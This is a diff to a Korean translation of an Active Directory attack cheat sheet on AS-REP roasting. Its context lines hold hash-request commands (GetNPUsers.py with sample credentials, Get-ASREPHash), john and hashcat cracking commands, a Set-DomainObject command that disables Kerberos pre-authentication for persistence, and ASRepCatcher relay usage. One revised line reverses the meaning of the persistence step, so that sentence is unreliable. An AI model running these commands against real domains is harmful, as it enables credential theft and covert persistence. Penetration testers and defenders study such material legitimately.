@@ -33,16 +33,16 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP 로스팅을 Rubeus로 수행하면 0x17의 암호화 유형과 0의 사전 인증 유형을 가진 4768이 생성됩니다.
+> AS-REP 로스팅을 Rubeus로 수행하면 4768이 생성되며, 암호화 유형은 0x17이고 사전 인증 유형은 0입니다.
 
 ### 크래킹
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### Persistence
+### 지속성
 
-**GenericAll** 권한(또는 속성 쓰기 권한)이 있는 사용자에 대해 **preauth**가 필요하지 않도록 강제합니다:
+**GenericAll** 권한(또는 속성을 쓸 수 있는 권한)이 있는 사용자에 대해 **preauth**를 강제할 필요가 없습니다:
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -64,7 +64,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-## 참조
+## 참고 문헌
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
